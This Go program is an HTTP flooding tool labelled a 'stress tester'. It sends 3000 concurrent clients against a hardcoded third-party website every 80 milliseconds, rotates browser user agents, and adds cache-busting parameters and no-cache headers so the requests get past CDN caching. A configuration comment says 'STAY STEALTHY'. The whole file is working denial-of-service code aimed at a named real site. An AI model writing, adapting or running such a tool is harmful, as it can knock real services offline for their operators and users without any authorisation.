package main

import (
	"io"
	"log"
	"math/rand"
	"net/http"
	"os"
	"os/signal"
	"runtime"
	"runtime/debug"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

// ==========================================
// CONFIGURATION (STAY STEALTHY)
// ==========================================
var (
	SERVER_URL      = getEnv("TARGET_URL", "https://www.ddwallet.vip/")
	TOTAL_CLIENTS   = 3000           // Number of concurrent refresh clients
	MAX_WORKERS     = 3000
	REFRESH_DELAY   = 80 * time.Millisecond // Lower = heavier stress (80ms ≈ 375 RPS total)
)

// Worker Semaphore to limit max workers
var workerSemaphore = make(chan struct{}, MAX_WORKERS)

func init() {
	rand.Seed(time.Now().UnixNano())
}

// ==========================================
// HELPERS
// ==========================================
func getEnv(key, defaultValue string) string {
	if value, exists := os.LookupEnv(key); exists {
		return value
	}
	return defaultValue
}

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
}

// ==========================================
// CLIENT STRUCT
// ==========================================
type StressClient struct {
	clientID     int
	running      bool
	lastActivity time.Time
	lock         sync.Mutex
	httpClient   *http.Client
}

func NewStressClient(id int) *StressClient {
	return &StressClient{
		clientID: id,
		httpClient: &http.Client{
			Timeout: 15 * time.Second,
		},
	}
}

func (c *StressClient) DoRefresh() {
	c.lock.Lock()
	c.lastActivity = time.Now()
	c.lock.Unlock()

	// Strong cache busting (timestamp + random) so it NEVER hits cache / CDN edge the same way
	buster := strconv.FormatInt(time.Now().UnixNano(), 10)
	targetURL := SERVER_URL
	if strings.Contains(targetURL, "?") {
		targetURL += "&_=" + buster
	} else {
		targetURL += "?_=" + buster
	}

	req, err := http.NewRequest("GET", targetURL, nil)
	if err != nil {
		log.Printf("[Client %d] NewRequest failed: %v", c.clientID, err)
		return
	}

	// Realistic browser + aggressive no-cache headers
	req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate, max-age=0")
	req.Header.Set("Pragma", "no-cache")
	req.Header.Set("Expires", "0")
	req.Header.Set("Connection", "keep-alive")

	resp, err := c.httpClient.Do(req)
	if err != nil {
		log.Printf("[Client %d] Request error: %v", c.clientID, err)
		return
	}
	defer resp.Body.Close()

	// Consume body (simulates real browser, keeps connection alive for load balancer test)
	io.Copy(io.Discard, resp.Body)

	log.Printf("[Client %d] Page Refresh -> Status: %d | %s", c.clientID, resp.StatusCode, targetURL)
}

func (c *StressClient) Run() {
	c.running = true
	workerSemaphore <- struct{}{}
	defer func() { <-workerSemaphore }()

	for c.running {
		c.DoRefresh()
		time.Sleep(REFRESH_DELAY)
		runtime.Gosched()
	}
}

func main() {
	log.SetFlags(log.LstdFlags | log.Lmsgprefix)
	debug.SetMemoryLimit(850 * 1024 * 1024)
	runtime.GOMAXPROCS(runtime.NumCPU())

	log.Println("========================================")
	log.Println(" KING-CLAIMER HTTP REFRESH STRESS TESTER ")
	log.Printf(" Target: %s", SERVER_URL)
	log.Printf(" Clients: %d | Workers: %d | Delay: %v", TOTAL_CLIENTS, MAX_WORKERS, REFRESH_DELAY)
	log.Println(" Mode: Repeated page refresh + full cache bypass")
	log.Println(" Purpose: Test regional routing + load balancing")
	log.Println("========================================")

	var wg sync.WaitGroup
	for i := 0; i < TOTAL_CLIENTS; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			client := NewStressClient(id)
			client.Run()
		}(i)
	}

	done := make(chan os.Signal, 1)
	signal.Notify(done, os.Interrupt, syscall.SIGINT, syscall.SIGTERM)
	<-done

	log.Println("Shutting down gracefully...")
	wg.Wait()
}
